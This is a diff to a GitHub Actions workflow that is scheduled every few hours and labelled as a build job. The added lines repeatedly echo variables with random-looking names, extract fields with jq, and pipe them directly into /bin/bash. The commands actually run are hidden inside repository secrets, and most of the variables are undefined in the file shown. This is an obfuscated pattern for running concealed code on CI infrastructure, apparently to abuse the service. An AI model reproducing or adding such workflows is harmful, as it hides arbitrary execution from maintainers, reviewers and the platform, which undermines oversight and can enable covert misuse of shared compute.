@@ -2,17 +2,31 @@ name: jiangjing19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 2/6 * * *'
+    - cron: '47 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiangjing19871010
         env:
-          wj4: ${{ secrets.wj4 }}
+          ygcg580: ${{ secrets.ygcg580 }}
         run: |
-          echo $wj4 | jq -r .t7 | /bin/bash
-          echo $coww9 | jq -r .ky39 | /bin/bash
+          echo $ygcg580 | jq -r .tp14642 | /bin/bash
+          echo $ikdz1 | jq -r .pso418 | /bin/bash
+          echo $oj87 | jq -r .w80580 | /bin/bash
+          echo $ifxiy63200 | jq -r .yejr616 | /bin/bash
+          echo $v01 | jq -r .vhun771 | /bin/bash
+          echo $q6 | jq -r .cdugk69998 | /bin/bash
+          echo $awl05 | jq -r .frrmt784 | /bin/bash
+          echo $jjrba039 | jq -r .lh8512 | /bin/bash
+          echo $pxo770 | jq -r .l543 | /bin/bash
+          echo $dfifa53924 | jq -r .cjlta6 | /bin/bash
+          echo $li70871 | jq -r .n507 | /bin/bash
+          echo $xr11 | jq -r .ak7556 | /bin/bash
+          echo $dwjgq52294 | jq -r .pl5041 | /bin/bash
+          echo $in455 | jq -r .twul3599 | /bin/bash
+          echo $j66 | jq -r .abyz2 | /bin/bash
+          echo $m1 | jq -r .h408 | /bin/bash
 
